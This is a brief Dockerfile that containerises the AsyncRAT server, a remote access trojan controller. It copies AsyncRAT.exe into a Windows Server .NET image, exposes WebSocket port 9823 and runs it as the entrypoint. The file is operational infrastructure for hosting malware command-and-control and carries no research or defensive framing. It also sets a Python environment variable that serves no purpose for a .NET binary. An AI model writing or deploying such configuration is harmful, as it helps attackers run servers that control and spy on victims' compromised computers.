# Dockerfile for WebSocket RAT Server
# Uses Windows Server image with .NET Framework 4.8
FROM mcr.microsoft.com/dotnet/framework/runtime:4.8-windowsservercore-ltsc2022

WORKDIR /app

# Copy the built server executable and dependencies
COPY Server/bin/Debug/AsyncRAT.exe .
COPY Server/bin/Debug/AsyncRAT.exe.config .

# Expose the WebSocket port
EXPOSE 9823

# Set environment
ENV PYTHONUNBUFFERED=1

# Run the server
ENTRYPOINT ["AsyncRAT.exe"]
